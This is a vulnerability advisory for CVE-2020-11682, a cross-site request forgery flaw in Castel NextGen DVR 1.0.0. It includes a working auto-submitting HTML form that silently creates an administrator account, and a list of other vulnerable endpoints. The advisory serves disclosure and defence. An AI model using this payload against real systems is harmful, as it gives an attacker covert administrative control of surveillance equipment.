A CSRF issue, CVE-2020-11682, was identified on **Castel NextGen DVR** version 1.0.0 due to the **__RequestVerificationToken** not being validated by the application

## Timeline

* Issue Disclosed: 3 Jun 2020 - [Blog
  post](https://www.securitymetrics.com/blog/where-did-request-come-from-cross-site-request-forgery-csrf)

## Description

A malicious user can craft a form such as:

~~~.html
<html>
  <body>
    <form action="$RHOST/Administration/Users/Create" method="POST">
      <input type="hidden" name="Username" value="csrf-example" />
      <input type="hidden" name="Email" value="csrf@example.com" />
      <input type="hidden" name="FirstName" value="Test" />
      <input type="hidden" name="LastName" value="Testest" />
      <input type="hidden" name="LDAPUser" value="false" />
      <input type="hidden" name="Roles[0].RoleId" value="0" />
      <input type="hidden" name="Roles[0].IsSelected" value="true" />
      <input type="hidden" name="Roles[1].RoleId" value="1" />
      <input type="hidden" name="Roles[1].IsSelected" value="true" />
      <input type="hidden" name="Roles[2].RoleId" value="2" />
      <input type="hidden" name="Roles[2].IsSelected" value="true" />
      <input type="hidden" name="Roles[3].RoleId" value="3" />
      <input type="hidden" name="Roles[3].IsSelected" value="true" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
~~~

When any user, that is authenticated to the **Castel NextGen DVR**, visits the malicious form a new Administrator is unintentionally created.

The following functionality is known to be vulnerable:

~~~
POST /Administration/Alerts/Create          POST /Administration/SMTP
POST /Administration/Alerts/Delete          POST /EventLog
POST /Administration/Archiving/             GET /Recordings/DeleteAnnotation
POST /Administration/Roles/Delete           POST /Administration/Archiving/Create
POST /Administration/Archiving/Delete       POST /Administration/FileStores/Create
POST /Administration/FileStores/Delete      POST /Administration/LDAP
POST /Administration/Roles/Edit/:RoleId     POST /Administration/Users/Delete
POST /Administration/Users/Create           GET /Recordings/SaveAnnotation
POST /Administration/Users/Edit/:UserId     POST /Administration/Users/ResetPassword
POST /Administration/Archiving/Edit/:ArchiveRuleId
POST /Administration/FileStores/Edit/:FileStoreId
POST /Administration/Alerts/Edit/:EventAlertId
~~~
